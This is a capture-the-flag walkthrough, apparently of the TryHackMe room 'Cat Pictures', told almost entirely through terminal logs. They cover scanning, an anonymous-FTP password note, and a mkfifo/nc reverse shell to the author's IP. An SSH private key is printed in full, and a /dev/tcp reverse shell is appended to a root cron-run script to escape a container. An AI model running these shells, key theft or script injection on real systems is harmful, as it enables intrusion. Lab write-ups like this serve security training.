---
I made a forum where you can post cute cat pictures!
---

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/0d75a543c66201b4aa996172b6043eb5.jpeg)


### Flags, flags, flags!

```

┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.225.218 --ulimit 5500 -b 65535 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.225.218:21
Open 10.10.225.218:22
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-23 19:19 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:19
Completed NSE at 19:19, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:19
Completed NSE at 19:19, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:19
Completed NSE at 19:19, 0.00s elapsed
Initiating Ping Scan at 19:19
Scanning 10.10.225.218 [2 ports]
Completed Ping Scan at 19:19, 2.24s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:19
Completed Parallel DNS resolution of 1 host. at 19:19, 0.02s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 19:19
Scanning 10.10.225.218 [2 ports]
Discovered open port 21/tcp on 10.10.225.218
Discovered open port 22/tcp on 10.10.225.218
Completed Connect Scan at 19:19, 0.23s elapsed (2 total ports)
Initiating Service scan at 19:19
Scanning 2 services on 10.10.225.218
Completed Service scan at 19:19, 1.49s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.225.218.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:19
NSE: [ftp-bounce 10.10.225.218:21] PORT response: 500 Illegal PORT command.
Completed NSE at 19:19, 9.67s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:19
Completed NSE at 19:19, 1.69s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:19
Completed NSE at 19:19, 0.00s elapsed
Nmap scan report for 10.10.225.218
Host is up, received conn-refused (0.23s latency).
Scanned at 2022-12-23 19:19:37 EST for 13s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.19.103
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp           162 Apr 02  2021 note.txt
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37436480d35a746281b7806b1a23d84a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIDEV5ShmazmTw/1A6+19Bz9t3Aa669UOdJ6wf+mcv3vvJmh6gC8V8J58nisEufW0xnT69hRkbqrRbASQ8IrvNS8vNURpaA0cycHDntKA17ukX0HMO7AS6X8uHfIFZwTck5v6tLAyHlgBh21S+wOEqnANSms64VcSUma7fgUCKeyJd5lnDuQ9gCnvWh4VxSNoW8MdV64sOVLkyuwd0FUTiGctjTMyt0dYqIUnTkMgDLRB77faZnMq768R2x6bWWb98taMT93FKIfjTjGHV/bYsd/K+M6an6608wMbMbWz0pa0pB5Y9k4soznGUPO7mFa0n64w6ywS7wctcKngNVg3H
|   256 53c682efd27733efc13d9c1513540eb2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCs+ZcCT7Bj2uaY3QWJFO4+e3ndWR1cDquYmCNAcfOTH4L7lBiq1VbJ7Pr7XO921FXWL05bAtlvY1sqcQT6W43Y=
|   256 ba97c323d4f2cc082ce12b3006189541 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGq9I/445X/oJstLHIcIruYVdW4KqIFZks9fygfPkkPq
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:19
Completed NSE at 19:19, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:19
Completed NSE at 19:19, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:19
Completed NSE at 19:19, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.12 seconds



┌──(kali㉿kali)-[~]
└─$ ftp 10.10.225.218
Connected to 10.10.225.218.
220 (vsFTPd 3.0.3)
Name (10.10.225.218:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||25494|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           162 Apr 02  2021 note.txt
226 Directory send OK.
ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||18761|)
150 Opening BINARY mode data connection for note.txt (162 bytes).
100% |**************************************************************|   162      363.68 KiB/s    00:00 ETA
226 Transfer complete.
162 bytes received in 00:00 (0.78 KiB/s)
ftp> quit
221 Goodbye.

┌──(kali㉿kali)-[~]
└─$ cat note.txt 
In case I forget my password, I'm leaving a pointer to the internal shell service on the server.

Connect to port 4420, the password is sardinethecat.
- catlover

┌──(kali㉿kali)-[~]
└─$ nc 10.10.225.218 4420
INTERNAL SHELL SERVICE
please note: cd commands do not work at the moment, the developers are fixing it at the moment.
do not use ctrl-c
Please enter password:
sardinethecat
Password accepted
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.19.103 1337 >/tmp/f

revshell

┌──(kali㉿kali)-[~]
└─$ rlwrap nc -lnvp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.225.218.
Ncat: Connection from 10.10.225.218:42522.
/bin/sh: 0: can't access tty; job control turned off
# whoami
/bin/sh: 1: whoami: not found
# which python3
/bin/sh: 2: which: not found
# cd /home
# ls
catlover
# cd catlover
# ls
runme
# cat runme
rebeccaPlease enter yout password: Welcome, catlover! SSH key transfer queued! touch /tmp/gibmethesshkeyAccess Deniedd

rebecca

./runme
Please enter yout password: rebecca
Welcome, catlover! SSH key transfer queued! 
# ls
id_rsa
runme
# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAmI1dCzfMF4y+TG3QcyaN3B7pLVMzPqQ1fSQ2J9jKzYxWArW5
IWnCNvY8gOZdOSWgDODCj8mOssL7SIIgkOuD1OzM0cMBSCCwYlaN9F8zmz6UJX+k
jSmQqh7eqtXuAvOkadRoFlyog2kZ1Gb72zebR75UCBzCKv1zODRx2zLgFyGu0k2u
xCa4zmBdm80X0gKbk5MTgM4/l8U3DFZgSg45v+2uM3aoqbhSNu/nXRNFyR/Wb10H
tzeTEJeqIrjbAwcOZzPhISo6fuUVNH0pLQOf/9B1ojI3/jhJ+zE6MB0m77iE07cr
lT5PuxlcjbItlEF9tjqudycnFRlGAKG6uU8/8wIDAQABAoIBAH1NyDo5p6tEUN8o
aErdRTKkNTWknHf8m27h+pW6TcKOXeu15o3ad8t7cHEUR0h0bkWFrGo8zbhpzcte
D2/Z85xGsWouufPL3fW4ULuEIziGK1utv7SvioMh/hXmyKymActny+NqUoQ2JSBB
QuhqgWJppE5RiO+U5ToqYccBv+1e2bO9P+agWe+3hpjWtiAUHEdorlJK9D+zpw8s
/+9CjpDzjXA45X2ikZ1AhWNLhPBnH3CpIgug8WIxY9fMbmU8BInA8M4LUvQq5A63
zvWWtuh5bTkj622QQc0Eq1bJ0bfUkQRD33sqRVUUBE9r+YvKxHAOrhkZHsvwWhK/
oylx3WECgYEAyFR+lUqnQs9BwrpS/A0SjbTToOPiCICzdjW9XPOxKy/+8Pvn7gLv
00j5NVv6c0zmHJRCG+wELOVSfRYv7z88V+mJ302Bhf6uuPd9Xu96d8Kr3+iMGoqp
tK7/3m4FjoiNCpZbQw9VHcZvkq1ET6qdzU+1I894YLVu258KeCVUqIMCgYEAwvHy
QTo6VdMOdoINzdcCCcrFCDcswYXxQ5SpI4qMpHniizoa3oQRHO5miPlAKNytw5PQ
zSKoIW47AObP2twzVAH7d+PWRzqAGZXW8gsF6Ls48LxSJGzz8V191PjbcGQO7Oro
Em8pQ+qCISxv3A8fKvG5E9xOspD0/3lsM/zGD9ECgYBOTgDAuFKS4dKRnCUt0qpK
68DBJfJHYo9DiJQBTlwVRoh/h+fLeChoTSDkQ5StFwTnbOg+Y83qAqVwsYiBGxWq
Q2YZ/ADB8KA5OrwtrKwRPe3S8uI4ybS2JKVtO1I+uY9v8P+xQcACiHs6OTH3dfiC
tUJXwhQKsUCo5gzAk874owKBgC/xvTjZjztIWwg+WBLFzFSIMAkjOLinrnyGdUqu
aoSRDWxcb/tF08efwkvxsRvbmki9c97fpSYDrDM+kOQsv9rrWeNUf4CpHJQuS9zf
ZSal1Q0v46vdt+kmqynTwnRTx2/xHf5apHV1mWd7PE+M0IeJR5Fg32H/UKH8ROZM
RpHhAoGAehljGmhge+i0EPtcok8zJe+qpcV2SkLRi7kJZ2LaR97QAmCCsH5SndzR
tDjVbkh5BX0cYtxDnfAF3ErDU15jP8+27pEO5xQNYExxf1y7kxB6Mh9JYJlq0aDt
O4fvFElowV6MXVEMY/04fdnSWavh0D+IkyGRcY5myFHyhWvmFcQ=
-----END RSA PRIVATE KEY-----

┌──(kali㉿kali)-[~/rsa_cat]
└─$ nano id_rsa  
                                                                                                           
┌──(kali㉿kali)-[~/rsa_cat]
└─$ cat id_rsa   
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAmI1dCzfMF4y+TG3QcyaN3B7pLVMzPqQ1fSQ2J9jKzYxWArW5
IWnCNvY8gOZdOSWgDODCj8mOssL7SIIgkOuD1OzM0cMBSCCwYlaN9F8zmz6UJX+k
jSmQqh7eqtXuAvOkadRoFlyog2kZ1Gb72zebR75UCBzCKv1zODRx2zLgFyGu0k2u
xCa4zmBdm80X0gKbk5MTgM4/l8U3DFZgSg45v+2uM3aoqbhSNu/nXRNFyR/Wb10H
tzeTEJeqIrjbAwcOZzPhISo6fuUVNH0pLQOf/9B1ojI3/jhJ+zE6MB0m77iE07cr
lT5PuxlcjbItlEF9tjqudycnFRlGAKG6uU8/8wIDAQABAoIBAH1NyDo5p6tEUN8o
aErdRTKkNTWknHf8m27h+pW6TcKOXeu15o3ad8t7cHEUR0h0bkWFrGo8zbhpzcte
D2/Z85xGsWouufPL3fW4ULuEIziGK1utv7SvioMh/hXmyKymActny+NqUoQ2JSBB
QuhqgWJppE5RiO+U5ToqYccBv+1e2bO9P+agWe+3hpjWtiAUHEdorlJK9D+zpw8s
/+9CjpDzjXA45X2ikZ1AhWNLhPBnH3CpIgug8WIxY9fMbmU8BInA8M4LUvQq5A63
zvWWtuh5bTkj622QQc0Eq1bJ0bfUkQRD33sqRVUUBE9r+YvKxHAOrhkZHsvwWhK/
oylx3WECgYEAyFR+lUqnQs9BwrpS/A0SjbTToOPiCICzdjW9XPOxKy/+8Pvn7gLv
00j5NVv6c0zmHJRCG+wELOVSfRYv7z88V+mJ302Bhf6uuPd9Xu96d8Kr3+iMGoqp
tK7/3m4FjoiNCpZbQw9VHcZvkq1ET6qdzU+1I894YLVu258KeCVUqIMCgYEAwvHy
QTo6VdMOdoINzdcCCcrFCDcswYXxQ5SpI4qMpHniizoa3oQRHO5miPlAKNytw5PQ
zSKoIW47AObP2twzVAH7d+PWRzqAGZXW8gsF6Ls48LxSJGzz8V191PjbcGQO7Oro
Em8pQ+qCISxv3A8fKvG5E9xOspD0/3lsM/zGD9ECgYBOTgDAuFKS4dKRnCUt0qpK
68DBJfJHYo9DiJQBTlwVRoh/h+fLeChoTSDkQ5StFwTnbOg+Y83qAqVwsYiBGxWq
Q2YZ/ADB8KA5OrwtrKwRPe3S8uI4ybS2JKVtO1I+uY9v8P+xQcACiHs6OTH3dfiC
tUJXwhQKsUCo5gzAk874owKBgC/xvTjZjztIWwg+WBLFzFSIMAkjOLinrnyGdUqu
aoSRDWxcb/tF08efwkvxsRvbmki9c97fpSYDrDM+kOQsv9rrWeNUf4CpHJQuS9zf
ZSal1Q0v46vdt+kmqynTwnRTx2/xHf5apHV1mWd7PE+M0IeJR5Fg32H/UKH8ROZM
RpHhAoGAehljGmhge+i0EPtcok8zJe+qpcV2SkLRi7kJZ2LaR97QAmCCsH5SndzR
tDjVbkh5BX0cYtxDnfAF3ErDU15jP8+27pEO5xQNYExxf1y7kxB6Mh9JYJlq0aDt
O4fvFElowV6MXVEMY/04fdnSWavh0D+IkyGRcY5myFHyhWvmFcQ=
-----END RSA PRIVATE KEY-----

┌──(kali㉿kali)-[~/rsa_cat]
└─$ chmod 600 id_rsa
                                                                                                           
┌──(kali㉿kali)-[~/rsa_cat]
└─$ ls              
id_rsa
                                                                                                           
┌──(kali㉿kali)-[~/rsa_cat]
└─$ ssh -i id_rsa catlover@10.10.225.218
The authenticity of host '10.10.225.218 (10.10.225.218)' can't be established.
ED25519 key fingerprint is SHA256:1eaD00/uot2wrnOhWADr5ZbjIDs9twYBymqkwtQKXk0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.225.218' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0


52 updates can be applied immediately.
25 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


Last login: Fri Jun  4 14:40:35 2021
root@7546fa2336d6:/# id
uid=0(root) gid=0(root) groups=0(root)
root@7546fa2336d6:/# cd /root
root@7546fa2336d6:/root# ls
flag.txt
root@7546fa2336d6:/root# cat flag.txt
7cf90a0e7c5d25f1a827d3efe6fe4d0edd63cca9

root@7546fa2336d6:/root# cd /
root@7546fa2336d6:/# ls -lah
total 108K
drwxr-xr-x   1 root root 4.0K Mar 25  2021 .
drwxr-xr-x   1 root root 4.0K Mar 25  2021 ..
-rw-------   1 root root  588 Jun  4  2021 .bash_history
-rwxr-xr-x   1 root root    0 Mar 25  2021 .dockerenv
drwxr-xr-x   1 root root 4.0K Apr  9  2021 bin
drwxr-xr-x   3 root root 4.0K Mar 24  2021 bitnami
drwxr-xr-x   2 root root 4.0K Jan 30  2021 boot
drwxr-xr-x   5 root root  340 Dec 24 00:21 dev
drwxr-xr-x   1 root root 4.0K Apr  9  2021 etc
drwxr-xr-x   2 root root 4.0K Jan 30  2021 home
drwxr-xr-x   1 root root 4.0K Sep 25  2017 lib
drwxr-xr-x   2 root root 4.0K Feb 18  2021 lib64
drwxr-xr-x   2 root root 4.0K Feb 18  2021 media
drwxr-xr-x   2 root root 4.0K Feb 18  2021 mnt
drwxrwxr-x   1 root root 4.0K Mar 25  2021 opt
drwxrwxr-x   2 root root 4.0K Mar 24  2021 post-init.d
-rwxrwxr-x   1 root root  796 Mar 24  2021 post-init.sh
dr-xr-xr-x 118 root root    0 Dec 24 00:21 proc
drwx------   1 root root 4.0K Mar 25  2021 root
drwxr-xr-x   4 root root 4.0K Feb 18  2021 run
drwxr-xr-x   1 root root 4.0K Apr  9  2021 sbin
drwxr-xr-x   2 root root 4.0K Feb 18  2021 srv
dr-xr-xr-x  13 root root    0 Dec 24 00:21 sys
drwxrwxrwt   1 root root 4.0K Dec 24 00:22 tmp
drwxrwxr-x   1 root root 4.0K Mar 24  2021 usr
drwxr-xr-x   1 root root 4.0K Feb 18  2021 var

It seems we are in docker container because we got root first. also there are .dockerenv 

root@7546fa2336d6:/# cat .bash_history
exit
exit
exit
exit
exit
exit
exit
ip a
ifconfig
apt install ifconfig
ip
exit
nano /opt/clean/clean.sh 
ping 192.168.4.20
apt install ping
apt update
apt install ping
apt install iptuils-ping
apt install iputils-ping
exit
ls
cat /opt/clean/clean.sh 
nano /opt/clean/clean.sh 
clear
cat /etc/crontab
ls -alt /
cat /post-init.sh 
cat /opt/clean/clean.sh 
bash -i >&/dev/tcp/192.168.4.20/4444 <&1
nano /opt/clean/clean.sh 
nano /opt/clean/clean.sh 
nano /opt/clean/clean.sh 
nano /opt/clean/clean.sh 
cat /var/log/dpkg.log 
nano /opt/clean/clean.sh 
nano /opt/clean/clean.sh 
exit
exit
exit

root@7546fa2336d6:/# cd opt
root@7546fa2336d6:/opt# ls
bitnami  clean
root@7546fa2336d6:/opt# cd clean/
root@7546fa2336d6:/opt/clean# ls
clean.sh
root@7546fa2336d6:/opt/clean# cat clean.sh
#!/bin/bash

rm -rf /tmp/*



echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.8.19.103/7777 0>&1'" >> clean.sh

root@7546fa2336d6:/opt/clean# echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.8.19.103/7777 0>&1'" >> clean.sh
root@7546fa2336d6:/opt/clean# cat /etc/crontab
cat: /etc/crontab: No such file or directory

┌──(kali㉿kali)-[~]
└─$ rlwrap nc -lnvp 7777
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::7777
Ncat: Listening on 0.0.0.0:7777
Ncat: Connection from 10.10.225.218.
Ncat: Connection from 10.10.225.218:40452.
bash: cannot set terminal process group (24349): Inappropriate ioctl for device
bash: no job control in this shell
root@cat-pictures:~# whoami
whoami
root
root@cat-pictures:~# cd /root
cd /root
root@cat-pictures:~# ls
ls
firewall
root.txt
root@cat-pictures:~# cat root.txt
cat root.txt
Congrats!!!
Here is your flag:

4a98e43d78bab283938a06f38d2ca3a3c53f0476


root@cat-pictures:~# cd firewall
cd firewall
root@cat-pictures:~/firewall# ls
ls
rules.fw
root@cat-pictures:~/firewall# cat rules.fw
cat rules.fw
# Generated by iptables-save v1.6.1 on Fri Apr  2 17:37:14 2021
*nat
:PREROUTING ACCEPT [9:540]
:INPUT ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
:POSTROUTING ACCEPT [9:540]
:DOCKER - [0:0]
-A PREROUTING -m addrtype --dst-type LOCAL -j DOCKER
-A OUTPUT ! -d 127.0.0.0/8 -m addrtype --dst-type LOCAL -j DOCKER
-A POSTROUTING -s 172.17.0.0/16 ! -o docker0 -j MASQUERADE
-A POSTROUTING -s 172.18.0.0/16 ! -o br-98674f8f20f9 -j MASQUERADE
-A POSTROUTING -s 172.18.0.3/32 -d 172.18.0.3/32 -p tcp -m tcp --dport 8443 -j MASQUERADE
-A POSTROUTING -s 172.18.0.3/32 -d 172.18.0.3/32 -p tcp -m tcp --dport 8080 -j MASQUERADE
-A DOCKER -i docker0 -j RETURN
-A DOCKER -i br-98674f8f20f9 -j RETURN
-A DOCKER ! -i br-98674f8f20f9 -p tcp -m tcp --dport 8080 -j DNAT --to-destination 172.18.0.3:8080
COMMIT
# Completed on Fri Apr  2 17:37:14 2021
# Generated by iptables-save v1.6.1 on Fri Apr  2 17:37:14 2021
*filter
:INPUT ACCEPT [0:0]
:FORWARD DROP [0:0]
:OUTPUT ACCEPT [219:19820]
:DOCKER - [0:0]
:DOCKER-ISOLATION-STAGE-1 - [0:0]
:DOCKER-ISOLATION-STAGE-2 - [0:0]
:DOCKER-USER - [0:0]
-A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
-A INPUT -p tcp -m tcp --dport 2375 -j REJECT --reject-with icmp-port-unreachable
-A INPUT -p tcp -m tcp --dport 21 -j REJECT --reject-with icmp-port-unreachable
-A INPUT -p tcp -m tcp --dport 8080 -j REJECT --reject-with icmp-port-unreachable
-A INPUT -p tcp -m tcp --dport 21 -j REJECT --reject-with icmp-port-unreachable
-A FORWARD -j DOCKER-USER
-A FORWARD -j DOCKER-ISOLATION-STAGE-1
-A FORWARD -o docker0 -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
-A FORWARD -o docker0 -j DOCKER
-A FORWARD -i docker0 ! -o docker0 -j ACCEPT
-A FORWARD -i docker0 -o docker0 -j ACCEPT
-A FORWARD -o br-98674f8f20f9 -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
-A FORWARD -o br-98674f8f20f9 -j DOCKER
-A FORWARD -i br-98674f8f20f9 ! -o br-98674f8f20f9 -j ACCEPT
-A FORWARD -i br-98674f8f20f9 -o br-98674f8f20f9 -j ACCEPT
-A DOCKER -d 172.18.0.3/32 ! -i br-98674f8f20f9 -o br-98674f8f20f9 -p tcp -m tcp --dport 8080 -j ACCEPT
-A DOCKER-ISOLATION-STAGE-1 -i docker0 ! -o docker0 -j DOCKER-ISOLATION-STAGE-2
-A DOCKER-ISOLATION-STAGE-1 -i br-98674f8f20f9 ! -o br-98674f8f20f9 -j DOCKER-ISOLATION-STAGE-2
-A DOCKER-ISOLATION-STAGE-1 -j RETURN
-A DOCKER-ISOLATION-STAGE-2 -o docker0 -j DROP
-A DOCKER-ISOLATION-STAGE-2 -o br-98674f8f20f9 -j DROP
-A DOCKER-ISOLATION-STAGE-2 -j RETURN
-A DOCKER-USER -j RETURN
COMMIT
# Completed on Fri Apr  2 17:37:14 2021

```

  
Flag 1

*7cf90a0e7c5d25f1a827d3efe6fe4d0edd63cca9*

Root Flag

*4a98e43d78bab283938a06f38d2ca3a3c53f0476*

[[Gallery]]